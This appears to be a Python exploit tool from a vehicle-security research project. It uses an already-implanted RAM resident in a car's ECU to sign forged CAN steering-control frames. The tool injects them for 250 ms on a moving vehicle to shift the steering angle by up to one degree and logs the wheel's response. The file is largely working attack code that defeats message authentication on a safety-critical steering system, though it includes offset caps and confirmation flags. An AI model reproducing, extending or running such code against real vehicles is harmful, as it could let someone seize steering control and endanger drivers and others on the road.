#!/usr/bin/env python3
"""Bounded moving Crown lateral-authority pulse using the proven RAM resident.

This tool does not install or modify the resident. It requires the exact Crown
resident/helper to be present, armed, and native-MAC-qualified already. It
captures a short moving baseline, derives a target from the fresh measured
0x025 steering angle plus an explicit offset of at most 1.0 degree, repeats the
existing signed B6 replacement path for 250 ms, then stops C7 transmission so
native B6 passes through unchanged again.

The probe deliberately does not encode a Crown minimum-speed threshold that has
not been recovered. It records the four native 0x0AA wheel values and requires
only that the car is observably moving rather than stationary.
"""
from __future__ import annotations

import argparse
import json
import sys
import time
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[4]
sys.path.insert(0, str(ROOT))

from exploit.ephemeral_runtime import crown_f30_b6_inline_signer as signer

BASELINE_MIN_SECONDS = 0.350
BASELINE_TIMEOUT_SECONDS = 2.500
PULSE_DURATION_SECONDS = 0.250
RATE_HZ = 50.0
POST_OBSERVE_SECONDS = 0.750
MAX_ABS_OFFSET_DEG = 1.0
DIRECTIONAL_RESPONSE_DEG = 0.20


class AuthorityProbeError(RuntimeError):
    pass


def u32_delta(after: int, before: int) -> int:
    return (int(after) - int(before)) & 0xFFFFFFFF


def offset_target(*, start_deg: float, offset_deg: float) -> tuple[int, float]:
    if offset_deg == 0.0 or abs(offset_deg) > MAX_ABS_OFFSET_DEG:
        raise AuthorityProbeError(f"offset must be nonzero and within ±{MAX_ABS_OFFSET_DEG:.1f} deg")
    raw = signer.target_raw_from_degrees(start_deg + offset_deg)
    target_deg = signer.target_degrees_from_raw(raw)
    if raw == signer.target_raw_from_degrees(start_deg):
        raise AuthorityProbeError("requested offset rounds to the current raw target")
    return raw, target_deg


def directional_delta(*, start_deg: float, offset_deg: float, angles: list[float]) -> float:
    if not angles:
        return 0.0
    if offset_deg > 0:
        return max(angle - start_deg for angle in angles)
    return max(start_deg - angle for angle in angles)


def summarize_angle_windows(*, samples: list[dict[str, Any]], pulse_start_t: float, pulse_end_t: float,
                            offset_deg: float, fallback_start_deg: float) -> dict[str, Any]:
    angle_rows = [row for row in samples if row["kind"] == "steering_angle"]
    baseline_rows = [row for row in angle_rows if float(row["t_seconds"]) < pulse_start_t]
    pulse_rows = [row for row in angle_rows if pulse_start_t <= float(row["t_seconds"]) <= pulse_end_t]
    post_rows = [row for row in angle_rows if float(row["t_seconds"]) > pulse_end_t]
    all_values = [float(row["angle_deg"]) for row in angle_rows]
    baseline_values = [float(row["angle_deg"]) for row in baseline_rows]
    pulse_values = [float(row["angle_deg"]) for row in pulse_rows]
    post_values = [float(row["angle_deg"]) for row in post_rows]
    reference = float(baseline_rows[-1]["angle_deg"]) if baseline_rows else fallback_start_deg
    pulse_directional = directional_delta(start_deg=reference, offset_deg=offset_deg, angles=pulse_values)
    pulse_end_angle = pulse_values[-1] if pulse_values else None
    pulse_end_directional = (
        (pulse_end_angle - reference) if offset_deg > 0 else (reference - pulse_end_angle)
    ) if pulse_end_angle is not None else None
    post_continuation = (
        directional_delta(start_deg=pulse_end_angle, offset_deg=offset_deg, angles=post_values)
        if pulse_end_angle is not None else None
    )
    return {
        "angle_rows": angle_rows,
        "all_values": all_values,
        "baseline_span_deg": (max(baseline_values) - min(baseline_values)) if baseline_values else None,
        "pulse_reference_deg": reference,
        "pulse_window_directional_delta_deg": pulse_directional,
        "pulse_end_directional_delta_deg": pulse_end_directional,
        "post_pulse_continuation_deg": post_continuation,
        "pulse_window_directional_motion_observed": pulse_directional >= DIRECTIONAL_RESPONSE_DEG,
    }


def collect_vehicle_samples(panda: Any, *, origin: float, samples: list[dict[str, Any]]) -> None:
    for row in panda.can_recv():
        if len(row) < 3:
            continue
        address = int(row[0]); data = bytes(row[-2]); bus = int(row[-1])
        if bus != signer.CONTROL_BUS:
            continue
        now = time.monotonic() - origin
        if address == signer.STEERING_ANGLE_CAN_ID and len(data) == 32:
            samples.append({
                "t_seconds": now,
                "kind": "steering_angle",
                "angle_deg": signer.decode_crown_steering_angle_deg(data),
                "data_hex": data.hex(),
            })
        elif address == signer.WHEEL_SPEED_CAN_ID and len(data) == 8:
            raw = signer.decode_crown_wheel_raw(data)
            centered = tuple(value - signer.CROWN_WHEEL_RAW_ZERO for value in raw)
            samples.append({
                "t_seconds": now,
                "kind": "wheel_speed",
                "raw": list(raw),
                "centered_raw": list(centered),
                "data_hex": data.hex(),
            })
        elif address == signer.READY_CAN_ID and len(data) == 8:
            samples.append({
                "t_seconds": now,
                "kind": "ready",
                "ready": (data[0] >> 7) & 1,
                "data_hex": data.hex(),
            })


def latest_kind(samples: list[dict[str, Any]], kind: str) -> dict[str, Any] | None:
    for row in reversed(samples):
        if row["kind"] == kind:
            return row
    return None


def moving_baseline(panda: Any, *, origin: float, samples: list[dict[str, Any]]) -> dict[str, Any]:
    started = time.monotonic()
    minimum_end = started + BASELINE_MIN_SECONDS
    deadline = started + BASELINE_TIMEOUT_SECONDS
    while time.monotonic() < deadline:
        collect_vehicle_samples(panda, origin=origin, samples=samples)
        ready = latest_kind(samples, "ready")
        wheel = latest_kind(samples, "wheel_speed")
        angle = latest_kind(samples, "steering_angle")
        moving = (
            wheel is not None
            and max(abs(int(value)) for value in wheel["centered_raw"]) > signer.CROWN_STATIONARY_RAW_TOLERANCE
        )
        if time.monotonic() >= minimum_end and ready is not None and ready["ready"] == 1 and moving and angle is not None:
            return {"ready": ready, "wheel_speed": wheel, "steering_angle": angle}
        time.sleep(0.001)

    ready = latest_kind(samples, "ready")
    wheel = latest_kind(samples, "wheel_speed")
    angle = latest_kind(samples, "steering_angle")
    if ready is None or ready["ready"] != 1:
        raise AuthorityProbeError(f"moving authority probe requires Crown READY=1; latest={ready}")
    if wheel is None:
        raise AuthorityProbeError("moving authority probe did not observe bus1 0x0AA")
    if angle is None:
        raise AuthorityProbeError("moving authority probe did not observe bus1 0x025")
    raise AuthorityProbeError(
        "moving authority probe requires non-stationary wheel-speed evidence; "
        f"centered_raw={wheel['centered_raw']}"
    )


def run(*, payload: Path, helper: Path, meta: Path, offset_deg: float) -> dict[str, Any]:
    bundle = signer.load_bundle(payload=payload, helper=helper, meta=meta)
    session = signer.InlineSignerSession(bundle, require_ready_parked=False)

    state_before = session.read_state()
    telemetry_before = signer.decode_signer_telemetry(
        signer._read_memory(session.client, session.uds_mod, signer.TELEMETRY_BASE, signer.TELEMETRY_SIZE)
    )
    if not (
        state_before["initialized"] and state_before["armed"]
        and state_before["last_command5_rc"] == 0
        and telemetry_before["native_verified_raw"] == 1
        and telemetry_before["last_done_flag"] == 1
        and telemetry_before["last_command_status"] == 0
    ):
        raise AuthorityProbeError(
            f"resident must already be armed with a clean sticky native-MAC oracle: state={state_before} telemetry={telemetry_before}"
        )

    samples: list[dict[str, Any]] = []
    origin = time.monotonic()
    baseline = moving_baseline(session.panda, origin=origin, samples=samples)
    start_deg = float(baseline["steering_angle"]["angle_deg"])
    target_raw, target_deg = offset_target(start_deg=start_deg, offset_deg=offset_deg)

    sequence = int(telemetry_before["last_control_seq"])
    period = 1.0 / RATE_HZ
    sent_sequences = 0
    sent_frames = 0
    pulse_start = time.monotonic()
    next_send = pulse_start
    while True:
        now = time.monotonic()
        if now - pulse_start >= PULSE_DURATION_SECONDS:
            break
        collect_vehicle_samples(session.panda, origin=origin, samples=samples)
        latest_ready = latest_kind(samples, "ready")
        if latest_ready is not None and latest_ready["ready"] != 1:
            raise AuthorityProbeError("Crown READY dropped during authority pulse; C7 transmission stopped")
        if now < next_send:
            time.sleep(min(next_send - now, 0.001))
            continue
        sequence = (sequence % 0xFF) + 1
        frame = signer.replacement_frame(sequence=sequence, target_angle_raw=target_raw)
        for _ in range(signer.WORD_REPEAT_COUNT):
            session.panda.can_send(signer.CONTROL_CAN_ID, frame, signer.CONTROL_BUS)
            sent_frames += 1
            time.sleep(signer.WORD_REPEAT_INTERVAL_SECONDS)
            collect_vehicle_samples(session.panda, origin=origin, samples=samples)
        sent_sequences += 1
        next_send += period

    # No more C7 after this point. Observe the immediate response/recovery while
    # native B6 passes through unchanged again.
    observe_deadline = time.monotonic() + POST_OBSERVE_SECONDS
    while time.monotonic() < observe_deadline:
        collect_vehicle_samples(session.panda, origin=origin, samples=samples)
        time.sleep(0.001)

    telemetry_after = signer.decode_signer_telemetry(
        signer._read_memory(session.client, session.uds_mod, signer.TELEMETRY_BASE, signer.TELEMETRY_SIZE)
    )
    state_after = session.read_state()
    signed_delta = u32_delta(state_after["signed_count"], state_before["signed_count"])
    attempt_delta = u32_delta(telemetry_after["command5_attempts"], telemetry_before["command5_attempts"])

    pulse_end = pulse_start + PULSE_DURATION_SECONDS
    pulse_start_t = pulse_start - origin
    pulse_end_t = pulse_end - origin
    angle_summary = summarize_angle_windows(
        samples=samples, pulse_start_t=pulse_start_t, pulse_end_t=pulse_end_t,
        offset_deg=offset_deg, fallback_start_deg=start_deg,
    )
    angle_rows = angle_summary["angle_rows"]
    angle_values = angle_summary["all_values"]
    final_ready = latest_kind(samples, "ready")
    final_wheel = latest_kind(samples, "wheel_speed")
    clean_signing = (
        signed_delta > 0 and attempt_delta == signed_delta
        and state_after["initialized"] and state_after["armed"]
        and state_after["last_command5_rc"] == 0
        and telemetry_after["native_verified_raw"] == 1
        and telemetry_after["last_done_flag"] == 1
        and telemetry_after["last_command_status"] == 0
        and final_ready is not None and final_ready["ready"] == 1
    )
    return {
        "schema": "crown-f30-b6-moving-authority-pulse-v1",
        "target": bundle.meta["target"],
        "requested": {
            "offset_deg": offset_deg,
            "pulse_duration_seconds": PULSE_DURATION_SECONDS,
            "rate_hz": RATE_HZ,
            "baseline_angle_deg": start_deg,
            "target_raw": target_raw,
            "target_deg": target_deg,
            "effective_offset_deg": target_deg - start_deg,
        },
        "control_ingress": {"can_id": "0x777", "transport": "stock functional UDS single frame"},
        "baseline": baseline,
        "final_ready": final_ready,
        "final_wheel_speed": final_wheel,
        "state_before": state_before,
        "state_after": state_after,
        "telemetry_before": telemetry_before,
        "telemetry_after": telemetry_after,
        "sent_sequences": sent_sequences,
        "sent_can_frames": sent_frames,
        "signed_replacement_delta": signed_delta,
        "command5_attempt_delta": attempt_delta,
        "samples": samples,
        "steering_angle_sample_count": len(angle_rows),
        "angle_min_deg": min(angle_values) if angle_values else None,
        "angle_max_deg": max(angle_values) if angle_values else None,
        "pulse_start_t_seconds": pulse_start_t,
        "pulse_end_t_seconds": pulse_end_t,
        "baseline_angle_span_deg": angle_summary["baseline_span_deg"],
        "pulse_reference_angle_deg": angle_summary["pulse_reference_deg"],
        "pulse_window_directional_delta_deg": angle_summary["pulse_window_directional_delta_deg"],
        "pulse_end_directional_delta_deg": angle_summary["pulse_end_directional_delta_deg"],
        "post_pulse_continuation_deg": angle_summary["post_pulse_continuation_deg"],
        "pulse_window_directional_motion_observed": angle_summary["pulse_window_directional_motion_observed"],
        "verdict": "signed_offset_pulse_delivered" if clean_signing else "authority_pulse_signing_not_clean",
        "authority_interpretation": "unqualified_driver_and_road_dynamics_not_removed",
        "interpretation_boundary": (
            "pulse-window 0x025 motion is reported separately from baseline and post-pulse motion; road/driver dynamics are not "
            "independently removed, so this probe alone does not prove or disprove physical authority or identify a minimum-speed/state gate"
        ),
        "persistent_flash_writes": False,
        "resident_bytes_modified": False,
        "post_pulse_behavior": "no further C7 is sent; native B6 passes through unchanged",
    }


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--payload", type=Path, required=True)
    ap.add_argument("--helper", type=Path, required=True)
    ap.add_argument("--meta", type=Path, required=True)
    ap.add_argument("--offset-deg", type=float, required=True)
    ap.add_argument("--execute", action="store_true")
    ap.add_argument("--moving-authority-confirmed", action="store_true")
    ap.add_argument("--output", type=Path)
    args = ap.parse_args()

    if not args.execute:
        try:
            offset_target(start_deg=0.0, offset_deg=args.offset_deg)
        except AuthorityProbeError as exc:
            print(f"refusing: {exc}", file=__import__("sys").stderr)
            return 2
        print(json.dumps({
            "schema": "crown-f30-b6-moving-authority-pulse-plan-v1",
            "offset_deg": args.offset_deg,
            "baseline_min_seconds": BASELINE_MIN_SECONDS,
            "baseline_timeout_seconds": BASELINE_TIMEOUT_SECONDS,
            "pulse_duration_seconds": PULSE_DURATION_SECONDS,
            "post_observe_seconds": POST_OBSERVE_SECONDS,
            "rate_hz": RATE_HZ,
            "mutation": "none until --execute; execute sends only bounded C7 offset control through the already-qualified resident",
            "speed_boundary": "requires observable wheel motion but does not assume an unrecovered Crown minimum-speed threshold",
            "resident_bytes_modified": False,
            "persistent_flash_writes": False,
        }, indent=2, sort_keys=True))
        return 0

    if not args.moving_authority_confirmed:
        print("refusing: --execute requires --moving-authority-confirmed", file=__import__("sys").stderr)
        return 2

    try:
        result = run(payload=args.payload, helper=args.helper, meta=args.meta, offset_deg=args.offset_deg)
    except (AuthorityProbeError, signer.InlineSignerError, OSError, ValueError) as exc:
        print(f"refusing: {exc}", file=__import__("sys").stderr)
        return 2
    text = json.dumps(result, indent=2, sort_keys=True) + "\n"
    if args.output:
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_text(text, encoding="utf-8")
    print(text, end="")
    return 0 if result["verdict"] != "authority_pulse_signing_not_clean" else 3


if __name__ == "__main__":
    raise SystemExit(main())
